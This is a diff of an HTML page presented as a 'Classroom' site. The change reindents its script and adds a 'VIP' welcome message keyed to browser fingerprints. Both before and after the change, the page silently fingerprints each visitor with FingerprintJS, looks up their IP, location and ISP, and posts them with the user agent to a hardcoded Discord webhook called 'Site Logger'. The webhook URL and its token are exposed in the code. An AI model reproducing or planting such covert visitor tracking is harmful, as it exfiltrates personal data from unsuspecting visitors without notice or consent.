@@ -3,15 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="title" content="ethanytang" />
+  <meta name="title" content="Classroom" />
   <meta name="robots" content="index, follow" />
   <meta name="google-site-verification" content="je81n_UtY27MEUx6Cy_o74rw-ibJmZRVluilmMSrD0k" />
   <link rel="icon" href="assets/img/classroom.png" type="image/png" />
   <title>Classroom</title>
   <link rel="stylesheet" href="style.css" />
-  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-
 </head>
 <body>
   <nav class="navbar">
@@ -129,12 +127,6 @@
     localStorage.setItem("visits", visits);
 
     const welcomeMsg = document.createElement("div");
-    welcomeMsg.textContent = visits === 1
-      ? "Welcome to the site for the first time!"
-      : `Welcome back! You've visited this site ${visits} times.`;
-
-    welcomeMsg.style.backgroundColor = "#333";
-    welcomeMsg.style.color = "#fff";
     welcomeMsg.style.padding = "10px 20px";
     welcomeMsg.style.borderRadius = "12px";
     welcomeMsg.style.fontSize = "18px";
@@ -147,19 +139,38 @@
 
     const navbar = document.querySelector(".navbar");
     navbar.insertAdjacentElement("afterend", welcomeMsg);
-  (async () => {
-    // Initialize FingerprintJS
-    const fp = await FingerprintJS.load();
 
-    // Get the visitor identifier
-    const result = await fp.get();
-    const visitorId = result.visitorId;
+    (async () => {
+      // Initialize FingerprintJS
+      const fp = await FingerprintJS.load();
 
-    // Fetch IP and location data
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(data => {
-        const message = `
+      // Get the visitor identifier
+      const result = await fp.get();
+      const visitorId = result.visitorId;
+
+      // Special visitor IDs array (replace with your real VIP IDs)
+      const specialIDs = [
+        "your-special-id-1",
+        "your-special-id-2"
+      ];
+
+      // Update welcome message for special visitors
+      if (specialIDs.includes(visitorId)) {
+        welcomeMsg.textContent = "🔥 Welcome back, VIP! 🔥";
+        welcomeMsg.style.backgroundColor = "#ff4500"; // fire orange for VIP
+      } else {
+        welcomeMsg.textContent = visits === 1
+          ? "Welcome to the site for the first time!"
+          : `Welcome back! You've visited this site ${visits} times.`;
+        welcomeMsg.style.backgroundColor = "#333";
+        welcomeMsg.style.color = "#fff";
+      }
+
+      // Fetch IP and location data
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const message = `
 📡 New visitor on your site!
 🆔 FingerprintJS ID: ${visitorId}
 🧠 IP: ${data.ip}
@@ -167,29 +178,28 @@
 🕹 ISP: ${data.org}
 💻 User Agent: ${navigator.userAgent}
 📅 Time: ${new Date().toLocaleString()}
-        `;
+          `;
 
-        return fetch("https://discord.com/api/webhooks/1378856491087433728/hOE-7hyJYr9dlWrLRLlKB3oM5IovYzCFf_K5tLrvOi2hSaC2UnFBDEtr7VHIfPeCBsCJ", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            username: "Site Logger",
-            content: message,
-          }),
+          return fetch("https://discord.com/api/webhooks/1378856491087433728/hOE-7hyJYr9dlWrLRLlKB3oM5IovYzCFf_K5tLrvOi2hSaC2UnFBDEtr7VHIfPeCBsCJ", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              username: "Site Logger",
+              content: message,
+            }),
+          });
+        })
+        .then(res => {
+          if (res.ok) {
+            console.log("✅ Sent FingerprintJS ID + IP info to Discord!");
+          } else {
+            console.error("❌ Failed to send to Discord", res.status);
+          }
+        })
+        .catch(err => {
+          console.error("⚠️ Error:", err);
         });
-      })
-      .then(res => {
-        if (res.ok) {
-          console.log("✅ Sent FingerprintJS ID + IP info to Discord!");
-        } else {
-          console.error("❌ Failed to send to Discord", res.status);
-        }
-      })
-      .catch(err => {
-        console.error("⚠️ Error:", err);
-      });
-  })();
-</script>
-
+    })();
+  </script>
 </body>
 </html>
